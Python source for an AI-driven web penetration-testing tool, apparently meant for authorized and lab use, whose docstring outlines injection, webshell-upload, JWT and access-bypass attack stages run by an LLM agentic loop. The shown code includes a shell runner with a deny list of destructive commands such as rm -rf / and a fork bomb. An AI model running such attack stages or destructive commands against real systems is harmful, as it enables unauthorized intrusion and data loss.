#!/usr/bin/env python3
# coding: utf-8
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PENTEST AI v8.0 — BLACK BOX EDITION                                         ║
║  True Agentic Loop · Dynamic Payloads · OWASP Top 10 · Zero Hardcoding       ║
║  OOB · JWT · WebSocket · File Upload · Recursive 403 · SmartProfile          ║
║  FOR AUTHORIZED PENTEST / CTF / LAB USE ONLY                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

WHAT'S NEW vs v7.0:
  ✓ TRUE AGENTIC LOOP — Ollama reads each response and decides next action
  ✓ DYNAMIC PAYLOAD GENERATION — AI writes payloads based on tech stack
  ✓ SLUG DEDUPLICATION — /users/:id tested once, not 1000 times
  ✓ SESSION BUG FIXED — all components use authenticated session correctly
  ✓ SAFE _run_cmd — no more blocking && in legit commands
  ✓ SMARTER DIFF — time-based blind detection, not just status codes
  ✓ AI DECIDES NEXT TEST — each finding triggers follow-up tests
  ✓ CONTEXT ACCUMULATION — scan state shared across all modules
  ✓ BETTER FP FILTER — response body diff, not just status
  ✓ TECH-AWARE WORDLISTS — PHP gets PHP paths, Java gets actuator paths

PIPELINE:
  0. RECON       → nmap · whatweb · wafw00f · subfinder · DNS
  1. FINGERPRINT → SmartFuzzProfile · custom 404 · tech detect
  2. SESSION     → login · multi-role · JWT · CSRF extract
  3. CRAWL       → links · forms · JS · API schema · slug dedup
  4. PARAMS      → HTML · JSON · hidden · cookies · GraphQL
  5. AI PLANNER  → endpoint scoring + prioritization
  6. AGENTIC LOOP→ AI decides payload → sends → reads → decides next
  7. OWASP FUZZ  → SQLi·XSS·LFI·SSTI·CMDi·XXE·SSRF·IDOR·JWT
  8. OOB         → blind SSRF/CMDi/XXE via interactsh
  9. 403 BYPASS  → recursive path·header·method (3 layers BFS)
  10. UPLOAD     → webshell · MIME bypass · RCE confirm
  11. JWT        → alg:none · RS256→HS256 · kid injection · crack
  12. WEBSOCKET  → auth bypass · injection · role escalation
  13. NUCLEI     → CVE · misconfig · default-creds
  14. CORRELATE  → weak signals → confirmed chains
  15. FP FILTER  → AI-verified false positive removal
  16. REPORT     → MD · JSON · HTML

USAGE:
  python3 pentest_ai_v8.py -t http://target.lab
  python3 pentest_ai_v8.py -t http://10.10.10.1 --deep --ctf
  python3 pentest_ai_v8.py -t http://app.lab -a /login -u admin -p admin123
  python3 pentest_ai_v8.py -t http://app.lab -a /login -u user -p pass -U admin -P secret
  python3 pentest_ai_v8.py -t http://target.com --oob
  python3 pentest_ai_v8.py -t http://spa.lab --mode spa --deep
"""

import argparse, asyncio, base64, collections, copy, datetime, difflib, math
import hashlib, html as html_mod, http.cookiejar, json, os, queue, re, shlex
import shutil, signal, socket, ssl, subprocess, sys, tempfile, threading
import time, traceback, urllib.error, urllib.parse, urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional, Set, Tuple

try:
    from report_generator import generate_authorized_report
except Exception:
    generate_authorized_report = None

# Make stdout/stderr robust for unicode output (Windows legacy codepages, logs, etc.)
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ── Optional imports ──────────────────────────────────────────────────────────
try:
    import ollama as _ollama
    HAS_OLLAMA = True
except ImportError:
    HAS_OLLAMA = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3; urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich import box
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    class _Con:
        def print(self, *a, **k):
            print(*[re.sub(r'\[/?[^\]]*\]', '', str(x)) for x in a])
        def rule(self, t=""): print("─" * 70 + f" {t}")
    console = _Con()

# ─────────────────────────────────────────────────────────────────────────────
# GLOBAL CONFIG
# ─────────────────────────────────────────────────────────────────────────────
MODEL_NAME      = os.environ.get("OLLAMA_MODEL", "minmax-m2:cloud")
OLLAMA_HOST     = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
REPORT_DIR      = Path("pentest_reports")
REPORT_DIR.mkdir(exist_ok=True)
_RESOLVED_MODEL_NAME = None

DEFAULT_TIMEOUT  = 12
MAX_CRAWL_DEPTH  = 3
MAX_URLS         = 400
MAX_WORKERS      = 6
MIN_CONFIDENCE   = 45
BASELINE_REPEATS = 3
AGENTIC_MAX_ITER = 20      # max iterations in agentic loop per endpoint
AI_CALL_TIMEOUT_SEC = max(5, int(os.environ.get("AI_CALL_TIMEOUT_SEC", "25")))
PAGE_ANALYSIS_AI_TIMEOUT_SEC = max(3, int(os.environ.get("PAGE_ANALYSIS_AI_TIMEOUT_SEC", "8")))
PAGE_ANALYSIS_AI_TIMEOUT_FALLBACK_SEC = max(
    PAGE_ANALYSIS_AI_TIMEOUT_SEC,
    int(os.environ.get("PAGE_ANALYSIS_AI_TIMEOUT_FALLBACK_SEC", "12")),
)
PAGE_ANALYSIS_MODEL = str(os.environ.get("PAGE_ANALYSIS_MODEL", "")).strip()
PAGE_ANALYSIS_BODY_CHARS = max(300, int(os.environ.get("PAGE_ANALYSIS_BODY_CHARS", "900")))
PAGE_ANALYSIS_PROGRESS_EVERY = max(1, int(os.environ.get("PAGE_ANALYSIS_PROGRESS_EVERY", "1")))
try:
    _PAGE_ANALYSIS_PRIORITY_RATIO = float(os.environ.get("PAGE_ANALYSIS_PRIORITY_RATIO", "0.35"))
except Exception:
    _PAGE_ANALYSIS_PRIORITY_RATIO = 0.35
PAGE_ANALYSIS_PRIORITY_RATIO = min(1.0, max(0.05, _PAGE_ANALYSIS_PRIORITY_RATIO))
PAGE_ANALYSIS_PRIORITY_MIN = max(1, int(os.environ.get("PAGE_ANALYSIS_PRIORITY_MIN", "12")))
PAGE_ANALYSIS_PRIORITY_MAX = max(PAGE_ANALYSIS_PRIORITY_MIN, int(os.environ.get("PAGE_ANALYSIS_PRIORITY_MAX", "60")))
DEFAULT_UA       = "Mozilla/5.0 (X11; Linux x86_64) PentestAI/8.0"
WEB_SAFE_REPORTS = str(os.environ.get("WEB_SAFE_REPORTS", "")).lower() in {"1", "true", "yes", "on"}
WEB_SAFE_PLACEHOLDER = "[hidden in web-safe report]"


def resolve_model_name(preferred: Optional[str] = None) -> str:
    global _RESOLVED_MODEL_NAME, MODEL_NAME
    preferred = str(preferred or MODEL_NAME or "").strip()
    if _RESOLVED_MODEL_NAME and (not preferred or _RESOLVED_MODEL_NAME == preferred):
        return _RESOLVED_MODEL_NAME

    try:
        tags_url = urllib.parse.urljoin(OLLAMA_HOST.rstrip("/") + "/", "api/tags")
        with urllib.request.urlopen(tags_url, timeout=5) as resp:
            payload = json.loads(resp.read().decode("utf-8", errors="replace"))
        names = [str(item.get("name") or "").strip() for item in payload.get("models", []) if item.get("name")]
        if preferred and preferred in names:
            chosen = preferred
        elif preferred:
            pref_base = preferred.split(":")[0].strip().lower()
            chosen = next((name for name in names if name.split(":")[0].strip().lower() == pref_base), "")
            if not chosen:
                chosen = names[0] if names else preferred
        else:
            chosen = names[0] if names else preferred
        if chosen:
            _RESOLVED_MODEL_NAME = chosen
            MODEL_NAME = chosen
            return chosen
    except Exception:
        pass

    return preferred or MODEL_NAME


def active_model_name() -> str:
    return resolve_model_name(MODEL_NAME)

BANNER = r"""

"""

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Endpoint:
    url:           str
    method:        str   = "GET"
    params:        dict  = field(default_factory=dict)
    headers:       dict  = field(default_factory=dict)
    body:          str   = ""
    body_type:     str   = "form"
    auth_required: bool  = False
    discovered_by: str   = ""
    depth:         int   = 0
    forms:         list  = field(default_factory=list)
    score:         float = 0.0
    template:      str   = ""   # normalized URL template for dedup: /users/:id

@dataclass
class SessionContext:
    cookies:    dict = field(default_factory=dict)
    headers:    dict = field(default_factory=dict)
    role:       str  = "anonymous"
    username:   str  = ""
    jwt_token:  str  = ""
    csrf_token: str  = ""
    login_url:  str  = ""
    logged_in:  bool = False

@dataclass
class Finding:
    owasp_id:          str
    owasp_name:        str
    title:             str
    risk:              str
    confidence:        int
    url:               str
    method:            str
    param:             str
    payload:           str
    evidence:          str
    baseline_diff:     str
    tool_output:       str
    request_raw:       str
    response_raw:      str
    exploit_cmd:       str
    remediation:       str
    confirmed:         bool      = False
    fp_filtered:       bool      = False
    oob:               bool      = False
    chain:             List[str] = field(default_factory=list)
    tool:              str       = ""
    timestamp:         str       = field(
        default_factory=lambda: datetime.datetime.now().isoformat()
    )
    suppression_reason: str = ""

    def risk_idx(self) -> int:
        return {"Critical":0,"High":1,"Medium":2,"Low":3,"Info":4}.get(self.risk,9)

    def to_dict(self, safe: bool = False) -> dict:
        d = self.__dict__.copy()
        if safe:
            for key in ("payload", "request_raw", "response_raw", "exploit_cmd"):
                if d.get(key):
                    d[key] = WEB_SAFE_PLACEHOLDER
        return d


class AIRequiredError(RuntimeError):
    """Raised when a required AI verification cannot be completed safely."""


TOOL_PURPOSES = {
    "ffuf": "Dir/param fuzzer",
    "sqlmap": "SQL injection",
    "dalfox": "XSS scanner",
    "commix": "Command injection",
    "wfuzz": "Generic fuzzer",
    "nikto": "Web server scanner",
    "nmap": "Port scanner",
    "whatweb": "Tech fingerprint",
    "wafw00f": "WAF detector",
    "nuclei": "CVE scanner",
    "hashcat": "Hash cracker",
    "subfinder": "Subdomain enum",
}

PIPELINE_STAGE_HINTS = [
    {"token": "RECON", "label": "Recon", "progress": 8},
    {"token": "LEAKBASE SCAN", "label": "LeakBase", "progress": 12},
    {"token": "SESSION SETUP", "label": "Session Setup", "progress": 18},
    {"token": "FINGERPRINTING", "label": "Fingerprinting", "progress": 24},
    {"token": "CRAWL", "label": "Crawl", "progress": 32},
    {"token": "PARAM DISCOVERY", "label": "Param Discovery", "progress": 40},
    {"token": "PAGE ANALYSIS", "label": "Page Analysis", "progress": 48},
    {"token": "SOURCE CODE REVIEW", "label": "Source Code Review", "progress": 50},
    {"token": "BAC MULTI ROLE", "label": "BAC Multi-Role", "progress": 52},
    {"token": "AI PLANNER", "label": "AI Planner", "progress": 56},
    {"token": "AGENTIC OWASP FUZZING", "label": "OWASP Fuzzing", "progress": 66},
    {"token": "SMART DIR FUZZ", "label": "Smart Dir Fuzz", "progress": 70},
    {"token": "NUCLEI", "label": "Nuclei", "progress": 74},
    {"token": "RECURSIVE 403 BYPASS", "label": "403 Review", "progress": 80},
    {"token": "FUZZING BYPASSED ENDPOINTS", "label": "Bypassed Endpoint Fuzzing", "progress": 82},
    {"token": "FILE UPLOAD", "label": "Upload Review", "progress": 84},
    {"token": "JWT ATTACK", "label": "JWT Review", "progress": 88},
    {"token": "WEBSOCKET", "label": "WebSocket Review", "progress": 90},
    {"token": "INTERCEPTOR", "label": "Interceptor", "progress": 92},
    {"token": "OOB BLIND", "label": "OOB Review", "progress": 94},
    {"token": "FP FILTER", "label": "FP Filter", "progress": 96},
    {"token": "CORRELATE", "label": "Correlate", "progress": 97},
    {"token": "REPORT", "label": "Report", "progress": 99},
    {"token": "SAVING MEMORY KNOWLEDGE", "label": "Saving Memory", "progress": 100},
    {"token": "KNOWLEDGE BASE ADVISOR", "label": "Knowledge Base Advisor", "progress": 100},
    {"token": "AI ASSESSMENT", "label": "AI Assessment", "progress": 100},
]

CLI_ARGUMENT_SPECS = [
    {"flags": ["--target", "-t"], "required": True, "default": None, "help": "Target base URL"},
    {"flags": ["--auth-url", "-a"], "default": "", "help": "Authentication URL"},
    {"flags": ["--user", "-u"], "default": "", "help": "Primary username"},
    {"flags": ["--password", "-p"], "default": "", "help": "Primary password"},
    {"flags": ["--admin-user", "-U"], "default": "", "help": "Admin username for BAC checks"},
    {"flags": ["--admin-pass", "-P"], "default": "", "help": "Admin password for BAC checks"},
    {"flags": ["--mode", "-m"], "default": "full", "choices": ["full", "web", "api", "spa", "quick"], "help": "Scan mode"},
    {"flags": ["--deep"], "action": "store_true", "default": False, "help": "Enable deep mode"},
    {"flags": ["--ctf"], "action": "store_true", "default": False, "help": "Enable CTF mode"},
    {"flags": ["--oob"], "action": "store_true", "default": False, "help": "Enable OOB checks"},
    {"flags": ["--no-nuclei"], "action": "store_true", "default": False, "help": "Disable nuclei phase"},
    {"flags": ["--no-403"], "action": "store_true", "default": False, "help": "Disable 403 bypass phase"},
    {"flags": ["--no-upload"], "action": "store_true", "default": False, "help": "Disable upload phase"},
    {"flags": ["--model"], "default": "", "help": "Override Ollama model"},
    {"flags": ["--report-template"], "default": "", "help": "DOCX template path for authorized report export"},
    {"flags": ["--tools"], "action": "store_true", "default": False, "help": "Only print tool status"},
    {"flags": ["--chat"], "action": "store_true", "default": False, "help": "Scan oxirida AI bilan gaplashib darslar saqlash"},
    {"flags": ["--advisor"], "action": "store_true", "default": False, "help": "Scan qilmasdan faqat KB advisor rejimi"},
]


def finding_field_names() -> List[str]:
    return list(Finding.__dataclass_fields__.keys())


def tool_purposes() -> Dict[str, str]:
    return dict(TOOL_PURPOSES)


def pipeline_stage_hints() -> List[dict]:
    return [dict(item) for item in PIPELINE_STAGE_HINTS]


def cli_argument_schema() -> List[dict]:
    schema = []
    for spec in CLI_ARGUMENT_SPECS:
        item = {
            "flags": list(spec["flags"]),
            "required": bool(spec.get("required", False)),
            "default": spec.get("default"),
            "help": spec.get("help", ""),
        }
        if "choices" in spec:
            item["choices"] = list(spec["choices"])
        if "action" in spec:
            item["action"] = spec["action"]
        schema.append(item)
    return schema


def web_panel_metadata() -> dict:
    return {
        "finding_fields": finding_field_names(),
        "tools": tool_purposes(),
        "pipeline_stages": pipeline_stage_hints(),
        "cli_args": cli_argument_schema(),
    }


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Pentest AI v8.0 — True Agentic Black Box Testing",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python3 pentest_ai_v8.py -t http://target.lab
  python3 pentest_ai_v8.py -t http://10.10.10.1 --deep --ctf
  python3 pentest_ai_v8.py -t http://app.lab -a /login -u admin -p admin123
  python3 pentest_ai_v8.py -t http://app.lab -a /login -u user -p pass -U admin -P secret
  python3 pentest_ai_v8.py -t http://target.com --oob --deep
"""
    )
    for spec in CLI_ARGUMENT_SPECS:
        kwargs = {}
        if spec.get("required"):
            kwargs["required"] = True
        if "default" in spec and spec.get("action") != "store_true":
            kwargs["default"] = spec.get("default")
        if "choices" in spec:
            kwargs["choices"] = list(spec["choices"])
        if "action" in spec:
            kwargs["action"] = spec["action"]
        if spec.get("help"):
            kwargs["help"] = spec["help"]
        parser.add_argument(*spec["flags"], **kwargs)
    return parser

@dataclass
class BaselineFingerprint:
    status:        int
    body_len:      int
    body_hash:     str
    title:         str
    timing_avg:    float
    headers_sig:   str
    word_count:    int
    error_strings: list

@dataclass
class SmartFuzzProfile:
    base_url:        str
    probe_results:   list
    filter_codes:    list
    filter_sizes:    list
    filter_words:    list
    filter_lines:    list
    filter_hashes:   list
    match_codes:     list
    tolerance_bytes: int
    ai_explanation:  str
    recursive:       bool
    depth:           int

    def ffuf_filter_args(self) -> str:
        args = []
        if self.filter_codes:
            args.append(f"-fc {','.join(str(c) for c in self.filter_codes)}")
        if self.filter_sizes:
            args.append(f"-fs {','.join(str(s) for s in self.filter_sizes)}")
        if self.filter_words:
            args.append(f"-fw {','.join(str(w) for w in self.filter_words)}")
        if self.filter_lines:
            args.append(f"-fl {','.join(str(l) for l in self.filter_lines)}")
        return " ".join(args)

    def summary(self) -> str:
        p = []
        if self.filter_codes:  p.append(f"fc={self.filter_codes}")
        if self.filter_sizes:  p.append(f"fs={self.filter_sizes}")
        if self.filter_words:  p.append(f"fw={self.filter_words}")
        if self.filter_lines:  p.append(f"fl={self.filter_lines}")
        return "  ".join(p) or "no filters"

# ─────────────────────────────────────────────────────────────────────────────
# SCAN CONTEXT — shared state across all modules
# ─────────────────────────────────────────────────────────────────────────────
class ScanContext:
    """
    Central state shared across all scan modules.
    Prevents re-testing the same endpoint with the same payload.
    """
    def __init__(self):
        self.target:      str  = ""
        self.site_tech:   dict = {}
        self.findings:    List[Finding] = []
        self.signals:     List[dict]    = []
        self.tested:      Set[str]      = set()   # "url:method:param:payload" combos
        self.memory:      "FailureMemory" = None  # set by PentestPipeline
        self.lock = threading.Lock()

    def already_tested(self, url: str, method: str, param: str, payload: str) -> bool:
        key = hashlib.md5(f"{url}|{method}|{param}|{payload[:50]}".encode()).hexdigest()
        with self.lock:
            if key in self.tested:
                return True
            self.tested.add(key)
            return False

    def add_finding(self, f: Finding):
        with self.lock:
            self.findings.append(f)

    def add_signal(self, s: dict):
        with self.lock:
            self.signals.append(s)

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _run_cmd(cmd: str, timeout: int = 60) -> dict:
    """
    Safe command runner.
    FIXED v8: only blocks truly dangerous patterns, not legitimate && usage.
    """
    # Only block truly destructive commands
    _BLOCKED = ["rm -rf /", "mkfs.", "dd if=/dev/zero", ":(){ :|:& };:",
                "shutdown -h", "reboot", "format c:"]
    cmd_lower = cmd.lower()
    for b in _BLOCKED:
        if b in cmd_lower:
            return {"success": False, "output": f"Blocked: {b}", "cmd": cmd}
    try:
        if any(c in cmd for c in ["|", ">", "<", "2>/dev/null", "2>&1"]):
            clean = cmd.replace("2>/dev/null", f"2>{os.devnull}")
            p = subprocess.run(clean, shell=True, capture_output=True,
                               text=True, timeout=timeout)
        else:
            p = subprocess.run(shlex.split(cmd), capture_output=True,
                               text=True, timeout=timeout)
        return {
            "success": p.returncode == 0,
            "output":  (p.stdout + p.stderr)[:12000],
            "cmd":     cmd,
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "output": f"Timeout after {timeout}s", "cmd": cmd}
    except Exception as e:
        return {"success": False, "output": str(e), "cmd": cmd}


def _normalize_url_template(url: str) -> str:
    """
    Convert /users/123/posts/456 → /users/:id/posts/:id
    Prevents re-testing 1000 different IDs.
    Also handles UUIDs and slugs.
    """
    parsed = urllib.parse.urlparse(url)
    parts  = parsed.path.split("/")
    new    = []
    for p in parts:
        if not p:
            new.append(p)
            continue
        # Numeric ID
        if re.fullmatch(r'\d+', p):
            new.append(':id')
        # UUID
        elif re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', p, re.I):
            new.append(':uuid')
        # Hash-like (32+ hex chars)
        elif re.fullmatch(r'[0-9a-f]{32,}', p, re.I):
            new.append(':hash')
        # Slug (lowercase-with-dashes, 4-80 chars, at least one dash)
        elif re.fullmatch(r'[a-z0-9][a-z0-9\-]{3,78}[a-z0-9]', p) and '-' in p:
            new.append(':slug')
        else:
            new.append(p)
    template = urllib.parse.urlunparse(parsed._replace(path="/".join(new), query=""))
    return template


# ─────────────────────────────────────────────────────────────────────────────
# FAILURE MEMORY — AI o'z xatolaridan o'rganadi
# ─────────────────────────────────────────────────────────────────────────────
class FailureMemory:
    """
    Scan davomida AI qilgan xatolar yodlab olinadi.
    Keyingi bir xil vaziyatda xato qaytarilmaydi.

    3 turdagi xato yodlanadi:

    1. FALSE POSITIVE — AI "found=True" dedi, FPFilter "is_fp=True" dedi.
       Ya'ni AI zaiflik topdi deb o'yladi, lekin aslida yo'q edi.
       → Keyingi scan da o'sha pattern qaytarilmaydi.

    2. WRONG ACTION — AI decide_next_action() bilan test_X dedi,
       lekin o'sha endpoint + tech + param kombinatsiyasida hech narsa topilmadi
       va AI o'zi "bu endpoint uchun bu test befoyda" deb tan oldi.
       → Keyingi scan da o'sha (tech, endpoint_type, action) combo skip qilinadi.

    3. PAYLOAD FAILURE — AI yozgan payload response ni o'zgartirmadi,
       ya'ni texnologiyaga mos emas edi.
       → Keyingi payload generatsiyada bu payload exclude qilinadi.

    Xotira scan sessiyasi davomida saqlanadi (RAM).
    Scan tugagach disk ga yoziladi (JSON) — keyingi scan uchun ham ishlatiladi.
    """

    MEMORY_FILE = Path(__file__).parent / "pentest_reports" / "failure_memory.json"

    def __init__(self):
        self._fps:     List[dict] = []   # false positive patterns
        self._actions: List[dict] = []   # wrong action patterns
        self._payloads:List[dict] = []   # failed payload patterns
        self._lock = threading.Lock()
        self._load()

    # ── Disk load/save ────────────────────────────────────────────────────────
    def _load(self):
        """Oldingi scan sessiyalaridan xotira yuklash."""
        try:
            if self.MEMORY_FILE.exists():
                data = json.loads(self.MEMORY_FILE.read_text())
                self._fps      = data.get("false_positives", [])[-200:]  # max 200
                self._actions  = data.get("wrong_actions",   [])[-200:]
                self._payloads = data.get("failed_payloads", [])[-500:]
                total = len(self._fps) + len(self._actions) + len(self._payloads)
                if total > 0:
                    console.print(
                        f"[dim]  FailureMemory: loaded {total} lessons from previous scans[/dim]"
                    )
        except Exception:
            pass

    def save(self):
        """Scan oxirida xotirani diskka yozish."""
        try:
            self.MEMORY_FILE.parent.mkdir(exist_ok=True)
            with self._lock:
                data = {
                    "false_positives": self._fps,
                    "wrong_actions":   self._actions,
                    "failed_payloads": self._payloads,
                    "last_updated":    datetime.datetime.now().isoformat(),
                    "total_lessons":   len(self._fps)+len(self._actions)+len(self._payloads),
                }
            self.MEMORY_FILE.write_text(
                json.dumps(data, indent=2, ensure_ascii=False)
            )
            console.print(
                f"  [dim]  FailureMemory saved: "
                f"{len(self._fps)} FPs, "
                f"{len(self._actions)} wrong actions, "
                f"{len(self._payloads)} bad payloads[/dim]"
            )
        except Exception as e:
            console.print(f"  [dim red]  FailureMemory save error: {e}[/dim red]")

    # ── 1. FALSE POSITIVE xotira ──────────────────────────────────────────────
    def record_false_positive(self, finding: "Finding", fp_reason: str,
                               tech: dict = None):
        """
        AI "found=True" dedi, lekin FPFilter "is_fp=True" dedi.
        Shu pattern yodlanadi.
        """
        pattern = {
            "ts":          datetime.datetime.now().isoformat(),
            "owasp_id":    finding.owasp_id,
            "tool":        finding.tool,
            "param_type":  self._param_type(finding.param),
            "payload_sig": self._payload_signature(finding.payload),
            "status_diff": finding.baseline_diff if finding.baseline_diff else "",
            "fp_reason":   fp_reason[:200],
            "tech_lang":   (tech or {}).get("lang", "unknown"),
            "tech_fw":     (tech or {}).get("framework", "unknown"),
            "url_pattern":  self._url_pattern(finding.url),
        }
        with self._lock:
            self._fps.append(pattern)
        console.print(
            f"  [dim yellow]  📚 Lesson learned (FP): "
            f"{finding.owasp_id} via {finding.tool} — {fp_reason}[/dim yellow]"
        )

    def was_false_positive_before(self, owasp_id: str, tool: str,
                                   param: str, payload: str,
                                   tech: dict = None,
                                   url: str = "") -> Optional[str]:
        """
        Bu kombinatsiya avval FP bo'lganmi?
        Bo'lgan bo'lsa — sababini qaytaradi (skip uchun).
        """
        param_type  = self._param_type(param)
        payload_sig = self._payload_signature(payload)
        url_pattern = self._url_pattern(url)
        tech_lang   = (tech or {}).get("lang", "unknown")

        with self._lock:
            for p in self._fps:
                # Exact match: owasp + tool + param_type + payload_signature
                if (p["owasp_id"]    == owasp_id   and
                    p["tool"]        == tool        and
                    p["param_type"]  == param_type  and
                    p["payload_sig"] == payload_sig):
                    # Tech match ham bo'lsa — more confident skip
                    return p["fp_reason"]
                # Partial match: owasp + tool + url_pattern — same endpoint type
                if (p["owasp_id"]    == owasp_id   and
                    p["tool"]        == tool        and
                    p["url_pattern"] == url_pattern and
                    p["tech_lang"]   == tech_lang   and
                    tech_lang        != "unknown"):
                    return p["fp_reason"]
        return None

    # ── 2. WRONG ACTION xotira ────────────────────────────────────────────────
    def record_wrong_action(self, action: str, endpoint_type: str,
                             tech: dict, reason: str):
        """
        AI tanlagan action bu (tech, endpoint_type) kombinatsiyasida
        hech narsa topmadi — befoyda edi.
        """
        pattern = {
            "ts":            datetime.datetime.now().isoformat(),
            "action":        action,
            "endpoint_type": endpoint_type,
            "tech_lang":     (tech or {}).get("lang", "unknown"),
            "tech_fw":       (tech or {}).get("framework", "unknown"),
            "reason":        reason[:200],
        }
        with self._lock:
            self._actions.append(pattern)
        console.print(
            f"  [dim]  📚 Lesson: skip '{action}' on {endpoint_type} "
            f"({tech.get('lang','?')}) — {reason[:60]}[/dim]"
        )

    def is_action_useless(self, action: str, endpoint_type: str,
                           tech: dict) -> bool:
        """
        Bu action bu (tech, endpoint_type) da avval befoyda bo'lganmi?
        3+ marta befoyda bo'lsa → True (skip).
        """
        tech_lang = (tech or {}).get("lang", "unknown")
        count = 0
        with self._lock:
            for p in self._actions:
                if (p["action"]        == action        and
                    p["endpoint_type"] == endpoint_type and
                    p["tech_lang"]     == tech_lang):
                    count += 1
        return count >= 3

    # ── 3. PAYLOAD FAILURE xotira ─────────────────────────────────────────────
    def record_failed_payload(self, vuln_type: str, payload: str,
                               tech: dict, reason: str):
        """
        Bu payload bu texnologiyada response ni o'zgartirmadi.
        """
        sig = self._payload_signature(payload)
        pattern = {
            "ts":        datetime.datetime.now().isoformat(),
            "vuln_type": vuln_type,
            "payload_sig": sig,
            "payload_preview": payload,
            "tech_lang": (tech or {}).get("lang", "unknown"),
            "tech_fw":   (tech or {}).get("framework", "unknown"),
            "reason":    reason[:200],
        }
        with self._lock:
            # Duplicate tekshirish — bir xil sig ikki marta saqlanmasin
            existing = [p for p in self._payloads
                        if p["payload_sig"] == sig
                        and p["tech_lang"] == pattern["tech_lang"]
                        and p["vuln_type"] == vuln_type]
            if not existing:
                self._payloads.append(pattern)

    def filter_known_bad_payloads(self, vuln_type: str, payloads: List[str],
                                   tech: dict) -> List[str]:
        """
        Payload listidan avval muvaffaqiyatsiz bo'lganlarini olib tashlash.
        Bu AI ga: "bu payloadlarni qayta sinab ko'rma" deydi.
        """
        tech_lang = (tech or {}).get("lang", "unknown")
        bad_sigs  = set()
        with self._lock:
            for p in self._payloads:
                if p["vuln_type"] == vuln_type and p["tech_lang"] == tech_lang:
                    bad_sigs.add(p["payload_sig"])

        if not bad_sigs:
            return payloads

        filtered = []
        skipped  = []
        for payload in payloads:
            sig = self._payload_signature(payload)
            if sig in bad_sigs:
                skipped.append(payload[:40])
            else:
                filtered.append(payload)

        if skipped:
            console.print(
                f"  [dim]  MemoryFilter: skipped {len(skipped)} known-bad "
                f"{vuln_type} payloads for {tech_lang}[/dim]"
            )
        return filtered if filtered else payloads  # hech narsa qolmasa — hammasini sinab ko'r

    # ── AI ga lesson summary berish ───────────────────────────────────────────
    def build_lesson_context(self, tech: dict, url: str = "") -> str:
        """
        AI promtiga qo'shiladigan qisqa dars xulosasi.
        AI o'zi qilgan xatolarni biladi va qaytarmaslikka harakat qiladi.
        """
        tech_lang   = (tech or {}).get("lang", "unknown")
        url_pattern = self._url_pattern(url)
        lessons     = []

        with self._lock:
            # Ushbu tech + url uchun FP lessons
            for p in self._fps[-50:]:
                if p["tech_lang"] == tech_lang or p["url_pattern"] == url_pattern:
                    lessons.append(
                        f"- Previously marked as FP: {p['owasp_id']} via "
                        f"{p['tool']} ({p['fp_reason']})"
                    )

            # Wrong action lessons
            seen_actions = set()
            for p in self._actions[-30:]:
                key = f"{p['action']}:{tech_lang}"
                if p["tech_lang"] == tech_lang and key not in seen_actions:
                    seen_actions.add(key)
                    lessons.append(
                        f"- Previously useless: {p['action']} on {tech_lang} "
                        f"({p['reason'][:60]})"
                    )

        if not lessons:
            return ""

        return (
            "\n\nLESSONS FROM PREVIOUS SCANS (avoid repeating these mistakes):\n"
            + "\n".join(lessons[:10])
        )

    # ── Statistika ────────────────────────────────────────────────────────────
    def stats(self) -> dict:
        with self._lock:
            return {
                "false_positives": len(self._fps),
                "wrong_actions":   len(self._actions),
                "failed_payloads": len(self._payloads),
                "total_lessons":   len(self._fps)+len(self._actions)+len(self._payloads),
            }

    def print_summary(self):
        s = self.stats()
        if s["total_lessons"] == 0:
            return
        console.print(
            f"\n[bold cyan]📚 AI Failure Memory Summary:[/bold cyan]\n"
            f"  False positives learned:  {s['false_positives']}\n"
            f"  Wrong actions learned:    {s['wrong_actions']}\n"
            f"  Failed payloads learned:  {s['failed_payloads']}\n"
            f"  Total lessons:            {s['total_lessons']}"
        )

    # ── Helper metodlar ───────────────────────────────────────────────────────
    @staticmethod
    def _param_type(param: str) -> str:
        """Param nomini umumiy tipga o'girish."""
        if not param: return "unknown"
        p = param.split(":")[-1].lower()
        if any(k in p for k in ["id","uid","pid","oid"]):   return "id_param"
        if any(k in p for k in ["file","path","dir"]):      return "file_param"
        if any(k in p for k in ["url","redirect","next"]):  return "url_param"
        if any(k in p for k in ["cmd","exec","command"]):   return "cmd_param"
        if any(k in p for k in ["user","name","email"]):    return "user_param"
        if any(k in p for k in ["token","key","secret"]):   return "token_param"
        if param.startswith("header:"):                      return "header_param"
        if param.startswith("cookie:"):                      return "cookie_param"
        return "generic_param"

    @staticmethod
    def _payload_signature(payload: str) -> str:
        """Payload uchun qisqa signature — minor variantlarda bir xil bo'ladi."""
        if not payload: return "empty"
        # Raqamlarni normalize — 127.0.0.1 va 127.0.0.2 bir xil signature
        normalized = re.sub(r'\d+', 'N', payload[:100].lower())
        normalized = re.sub(r'[a-f0-9]{8,}', 'HASH', normalized)
        return hashlib.md5(normalized.encode()).hexdigest()[:12]

    @staticmethod
    def _url_pattern(url: str) -> str:
        """URL ni umumiy pattern ga o'girish."""
        if not url: return "unknown"
        parsed = urllib.parse.urlparse(url)
        path   = parsed.path.lower()
        # /admin/users/123 → admin_resource
        if any(x in path for x in ["admin","dashboard","panel","manage"]): return "admin_endpoint"
        if any(x in path for x in ["login","signin","auth","register"]):   return "auth_endpoint"
        if any(x in path for x in ["api","v1","v2","graphql"]):            return "api_endpoint"
